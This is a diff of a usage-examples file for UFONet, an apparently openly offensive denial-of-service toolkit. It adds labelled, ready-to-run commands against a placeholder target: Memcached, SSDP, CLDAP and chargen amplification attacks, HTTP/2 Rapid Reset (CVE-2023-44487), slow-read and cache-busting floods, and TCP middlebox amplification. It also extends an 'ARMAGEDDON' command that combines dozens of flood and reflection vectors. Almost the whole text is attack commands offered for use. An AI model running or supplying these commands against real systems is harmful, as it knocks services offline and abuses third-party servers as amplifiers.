@@ -68,10 +68,52 @@
  ufonet -a "http://target.com" -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --xmas "1000" --nuke "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000"
 
 ----------------------------------------------
++_R3DST4R! v2.0 - mod-only direct attack (-m, no zombies needed) (as root):
+----------------------------------------------
+
+ ufonet -m "http://target.com" --memcached "100" --chargen "100" --ssdp "100"
+
+----------------------------------------------
++_CRUSHER (Memcached, 51000x amp) (as root):
+----------------------------------------------
+
+ ufonet -m "http://target.com" --memcached "1000"
+
+----------------------------------------------
++_PULSAR (SSDP/UPnP) + WORMHOLE (CLDAP) (as root):
+----------------------------------------------
+
+ ufonet -m "http://target.com" --ssdp "1000" --cldap "1000"
+
+----------------------------------------------
++_FLASHBANG (HTTP/2 Rapid Reset, CVE-2023-44487) (non-root):
+----------------------------------------------
+
+ ufonet -m "https://target.com" --rapidreset "200"
+
+----------------------------------------------
++_METEOR (cache-bust flood) + TRACTOR (slowread) (non-root):
+----------------------------------------------
+
+ ufonet -m "http://target.com" --goldeneye "500" --slowread "100"
+
+----------------------------------------------
++_CENSORSHIP (TCP middlebox amp, CVE-2022) (as root):
+----------------------------------------------
+
+ ufonet -m "http://target.com" --middlebox "500"
+
+----------------------------------------------
++_R3D_C0MB0 (mix of v2.0 amp + flood) (as root):
+----------------------------------------------
+
+ ufonet -m "http://target.com" --memcached "500" --ssdp "500" --chargen "500" --rapidreset "200" --goldeneye "500"
+
+----------------------------------------------
 +_ARMAGEDDON! (with ALL!) (as root):
 ----------------------------------------------
 
- ufonet -a http://target.com -r "100" --threads "100" --loic "1000" --loris "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" 
+ ufonet -a http://target.com -r "100" --threads "100" --loic "1000" --loris "1000" --slowread "1000" --goldeneye "1000" --rapidreset "1000" --ufosyn "1000" --spray "1000" --smurf "1000" --xmas "1000" --nuke "1000" --tachyon "1000" --monlist "1000" --fraggle "1000" --sniper "1000" --ufoack "1000" --uforst "1000" --finflood "1000" --droper "1000" --overlap "1000" --pinger "1000" --ufoudp "1000" --memcached "1000" --chargen "1000" --cldap "1000" --ssdp "1000" --qotd "1000" --tftp "1000" --wsdisco "1000" --coap "1000" --mssql "1000" --arms "1000" --plex "1000" --netbios "1000" --ripv1 "1000" --middlebox "1000"
 
 -----------------------------------------------------------------------------
 +_UFONET_EXAMPLES (online):
